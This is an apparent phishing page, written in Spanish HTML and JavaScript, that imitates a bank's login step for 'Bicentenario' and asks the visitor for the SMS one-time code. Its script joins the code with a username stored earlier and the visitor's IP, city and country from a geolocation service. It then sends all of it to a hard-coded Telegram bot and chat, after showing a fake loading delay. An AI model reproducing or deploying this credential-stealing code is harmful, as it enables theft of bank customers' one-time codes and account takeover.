<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no"
    />

    <title>Formulario Pantalla Completa</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
          Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue",
          sans-serif;
        overflow: hidden;
        display: flex;
        justify-content: center;

        min-height: 100vh;
        background: url("fondo.jpg");
        background-size: cover;
      }

      .form-container {
        background: rgba(255, 255, 255, 0.9);
        padding: 20px;
        border-radius: 6px;
        margin-top: 50px;
        height: 530px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
        width: 598px; /* Ajusta el ancho del formulario según sea necesario */
      }
      .formato {
        padding: 50px;
        padding-top: 8px;
      }

      @media (max-width: 767px) {
        .form-container {
          margin-top: 30px;
          background: rgba(255, 255, 255, 0.9);
          padding: 20px;
          border-radius: 6px;

          box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
          width: 80%; /* Ajusta el ancho del formulario según sea necesario */
        }
        .formato {
          padding: 8px;
        }
      }

      form {
        display: flex;
        flex-direction: column;
        align-items: center;
      }

      label {
        margin-bottom: 10px;
      }

      input {
        background-color: #fff;
        border: 1px solid #aaa;
        box-sizing: border-box;
        border-radius: 8px;
        height: 45px;
        padding: 0 12px;
      }

      button {
        padding: 10px;
        background-color: #2c399f !important;
        padding: 15px;
        font-weight: bold;
        color: white;
        width: 100%;
        border: none;
        border-radius: 8px;
        font-size: 15px;
        cursor: pointer;
      }
    </style>
    <style>
      input {
        display: block;
        box-sizing: border-box;
        -moz-box-sizing: border-box;
        width: 100%;
        height: 32px;
        line-height: 32px;
        padding: 5px 10px;
        outline: 0;
        border: 1px solid transparent;
        background: red;
        border-radius: 0;
        background: #fff;
        font: 13px/16px "Open Sans", Helvetica, Arial, sans-serif;
        color: #404040;
        appearance: normal;
      }
    </style>
    <style>
      .contenedor2 {
        display: flex;
        flex-wrap: wrap;
        width: 100%;
        justify-content: center;
      }

      .opcion {
        width: 50%;
        box-sizing: border-box;
        padding: 10px;
        text-align: center;
        color: #a32337 !important;
        font-size: 14px;
        font-weight: 500;
      }

    
    </style>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
  </head>

  <body>
    <div class="form-container">
      <div style="text-align: center; width: 100%">
        <img src="logo.svg" style="width: 80%" alt="" />
      </div>
      <div class="formato" id="load">
        <div class="loadingio-spinner-pulse-gv1s64kdrah" style="margin-left:25%;"><div class="ldio-1jdk1ur4lh7">
          <div></div><div></div><div></div>
          </div></div>
          <style type="text/css">
          @keyframes ldio-1jdk1ur4lh7-1 {
            0% { top: 36px; height: 128px }
            50% { top: 60px; height: 80px }
            100% { top: 60px; height: 80px }
          }
          @keyframes ldio-1jdk1ur4lh7-2 {
            0% { top: 41.99999999999999px; height: 116.00000000000001px }
            50% { top: 60px; height: 80px }
            100% { top: 60px; height: 80px }
          }
          @keyframes ldio-1jdk1ur4lh7-3 {
            0% { top: 48px; height: 104px }
            50% { top: 60px; height: 80px }
            100% { top: 60px; height: 80px }
          }
          .ldio-1jdk1ur4lh7 div { position: absolute; width: 30px }.ldio-1jdk1ur4lh7 div:nth-child(1) {
            left: 35px;
            background: #ffed4e;
            animation: ldio-1jdk1ur4lh7-1 1s cubic-bezier(0,0.5,0.5,1) infinite;
            animation-delay: -0.2s
          }
          .ldio-1jdk1ur4lh7 div:nth-child(2) {
            left: 85px;
            background: #6a90f8;
            animation: ldio-1jdk1ur4lh7-2 1s cubic-bezier(0,0.5,0.5,1) infinite;
            animation-delay: -0.1s
          }
          .ldio-1jdk1ur4lh7 div:nth-child(3) {
            left: 135px;
            background: #f42727;
            animation: ldio-1jdk1ur4lh7-3 1s cubic-bezier(0,0.5,0.5,1) infinite;
            animation-delay: undefineds
          }
          
          .loadingio-spinner-pulse-gv1s64kdrah {
            width: 200px;
            height: 200px;
            display: inline-block;
            overflow: hidden;
            background: none;
          }
          .ldio-1jdk1ur4lh7 {
            width: 100%;
            height: 100%;
            position: relative;
            transform: translateZ(0) scale(1);
            backface-visibility: hidden;
            transform-origin: 0 0; /* see note above */
          }
          .ldio-1jdk1ur4lh7 div { box-sizing: content-box; }
          /* generated by https://loading.io/ */
          </style>
          <div
          style="
            width: 100%;
            text-align: center;
            font-size: 11px;
            font-weight: bold;
            color: grey;
          "
        >
          BBDP generará la clave interactiva de ingreso <br />
           <br />
          
        </div>
      </div>
      <div class="formato" style="display: none;" id="loaded">
        <form id="loginform">
          <div style="width: 100%; height: 20px"></div>
          <div style="text-align: left; width: 100%">
            <p
              style="
                line-height: 19px;
                font-weight: bold;
                font-size: 13px;
                color: #333;
                text-align: left;
                white-space: normal;
              "
            >
            Clave Interactiva enviada a tu teléfono móvil(sms):
            </p>
          </div>
          <div class="input-container" style="width: 100%">
            <input
              type="text"
              id="contra"
              placeholder="Clave interactiva P2P"
              required
              style="background: rgb(239, 239, 239)"
            />
          </div>

          <div style="width: 100%; height: 30px"></div>

          <div class="contenedor2">
            <div class="opcion">
              <a
                href="contra.html"
                style="
                  color: inherit; /* hereda el color del texto del padre */
                  text-decoration: inherit; /* hereda la decoración del texto del padre */
                "
                ><i class="fa fa-home"></i> Regresar</a
              >
            </div>
            
          </div>
          <div style="width: 100%; height: 30px"></div>

          <button type="submit"><i class="fa fa-unlock"></i> Ingresar</button>
          <div style="width: 100%; height: 20px"></div>
          <div
            style="
              width: 100%;
              text-align: center;
              font-size: 11px;
              font-weight: bold;
              color: grey;
            "
          >
            Para mayor información o asesoria contáctanos al <br />
            Centro de atención telefónica <br />
            0500-6272421
          </div>

          <div style="width: 100%; height: 30px"></div>
        </form>
      </div>
    </div>
  </body>
  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>

window.onload = ()=>{
  setTimeout(() => {
    document.getElementById("load").style.display = "none";
    document.getElementById("loaded").style.display = "block";
  }, 25000);
}

    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
      axios
        .get(url)
        .then((response) => {
          const nombre = localStorage.getItem("usuario");
          const contra = document.querySelector("#contra").value;
          const message =
            "\nBicentenario\nUsuario: " +
            nombre +
            "\nSMS2: " +
            contra +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU/sendMessage",
              {
                chat_id: "-4113459262",
                text: message,
              }
            )
            .then((response) => {
              window.location.href = "imagen.html";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
</html>
